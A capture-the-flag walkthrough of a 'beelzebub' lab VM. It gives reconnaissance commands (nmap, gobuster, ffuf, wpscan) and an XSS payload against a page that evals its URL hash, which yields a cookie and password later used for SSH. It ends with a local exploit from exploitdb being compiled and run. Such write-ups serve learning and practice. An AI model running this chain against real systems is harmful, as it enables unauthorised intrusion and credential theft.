# Initial recon:

### $ netdiscover -i eth0

```
192.168.0.118   08:00:27:11:fc:62      2     120  PCS Systemtechnik GmbH
```

Export IP=192.168.0.118 in terminal

### $ nmap -sSVC -Pn -n -T4 -p- $IP -oN nmap_initial.log

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh?
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.29 (Ubuntu)
MAC Address: 08:00:27:11:FC:62 (PCS Systemtechnik/Oracle VirtualBox virtual
```

Lets see the webpage and bruteforce some hide directories
<img >

### $ gobuster dir -u http://192.168.0.119:80/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -X /usr/share/wordlists/Offensive-Payloads/File-Extensions-Wordlist.txt -b 404,403

```
/index.html           (Status: 200) [Size: 10918]
/index.php            (Status: 200) [Size: 271]
```

Looking into index.* i found in the source one comment in special:

```
<!--My heart was encrypted, "beelzebub" somehow hacked and decoded it.-md5-->
```

Encoding the string 'beelzebub'in md5sum we can use the result to bruteforce some hiden directories:
### $ echo -n 'beelzebub' | md5sum

```
d18e1e22becbd915b45e0e655429d487
```

Now we can use this hash to search for more directories
### $ ffuf -u http://$IP/d18e1e22becbd915b45e0e655429d487/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -e .txt,.html,.php,.js,.css -mc 200,302

```
license.txt             [Status: 200, Size: 19935, Words: 3334, Lines: 386, Duration: 1ms]
index.php               [Status: 200, Size: 57718, Words: 3590, Lines: 342, Duration: 1140ms]
readme.html             [Status: 200, Size: 7368, Words: 754, Lines: 99, Duration: 0ms]
wp-login.php            [Status: 200, Size: 5694, Words: 225, Lines: 87, Duration: 1041ms]
```

### $ gobuster dir -u http://$IP/d18e1e22becbd915b45e0e655429d487/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt

```
/wp-content           (Status: 301) [Size: 354] [--> http://192.168.56.108/d18e1e22becbd915b45e0e655429d487/wp-content/]
/wp-includes          (Status: 301) [Size: 355] [--> http://192.168.56.108/d18e1e22becbd915b45e0e655429d487/wp-includes/]
/wp-admin             (Status: 301) [Size: 352] [--> http://192.168.56.108/d18e1e22becbd915b45e0e655429d487/wp-admin/]

```

Enumerating the dirs and subdirs i found an page inside /wp-content/uploads/Talk to VALAK . The following javascript was exposed in the source code:
```
      const $name = document.getElementById('name');
      function showNameFromHash() {
        let hash = window.top.location.hash;

        if (hash.length > 6 && hash.includes('#name')) {
          let newName = hash.substr(6); 
          $name.innerHTML = '<span class="toast large">Hello, ' + newName + '!</span>';
          try {
            eval(newName);
          } catch(e) {
            console.error(e.message);
          }
        }
      }
      showNameFromHash();
      window.addEventListener('hashchange', showNameFromHash, false);
``` 

This code is vulnerable to XSS atack, lets put the following payload to test:
```
</span><script>alert(document.cookie)</script>
```

And we get an cookie and password:
```
Cookie=b7d0eff31b9cde9a862dc157bb33ec2a; Password=M4k3Ad3a1
```

Back to wp-admin directorie we can test this credentials, but we need the username for this. So i try enumerate wordpress with wpscan tool

### $ wpscan --url http://$IP/d18e1e22becbd915b45e0e655429d487/ -e u --force --ignore-main-redirect 
```
[i] User(s) Identified:

[+] krampus
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] valak
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

```

Now, we have users and credentials to test ssh connection:
### $ ssh krampus@$IP

Looking at the home files i see that bash.history have two lines about a possible exploit:
```
mv 47009 ./exploit.c
gcc exploit.c -o exploit
```
I search for this in exploitdb and i can found the .c file, so i transfer for target machina via ssh and compile it and run.
